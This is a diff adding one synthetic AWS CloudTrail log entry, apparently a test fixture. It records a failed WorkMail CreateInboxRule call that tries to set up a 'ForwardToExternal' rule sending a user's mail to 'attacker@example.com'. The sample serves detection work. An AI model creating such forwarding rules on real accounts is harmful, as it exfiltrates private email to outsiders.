@@ -1,0 +1,33 @@
+{
+  "eventVersion": "1.08",
+  "userIdentity": {
+    "type": "IAMUser",
+    "principalId": "AIDA...",
+    "arn": "arn:aws:iam::854209350369:user/employee-user",
+    "accountId": "854209350369",
+    "userName": "employee-user"
+  },
+  "eventTime": "2026-06-02T14:17:10Z",
+  "eventSource": "workmail.amazonaws.com",
+  "eventName": "CreateInboxRule",
+  "awsRegion": "us-east-2",
+  "sourceIPAddress": "172.31.32.91",
+  "userAgent": "aws-cli/2.14.6",
+  "errorCode": "OrganizationNotFoundException",
+  "errorMessage": "Organization not found",
+  "requestParameters": {
+    "OrganizationId": "dummy-org-id",
+    "UserId": "dummy-user",
+    "Name": "ForwardToExternal",
+    "Actions": {
+      "ForwardTo": ["attacker@example.com"]
+    }
+  },
+  "responseElements": null,
+  "requestID": "a1b2c3d4-5678-90ab-cdef-EXAMPLE12345",
+  "eventID": "e1f2g3h4-5678-90ab-cdef-EXAMPLE67890",
+  "readOnly": false,
+  "eventType": "AwsApiCall",
+  "managementEvent": true,
+  "recipientAccountId": "854209350369"
+}
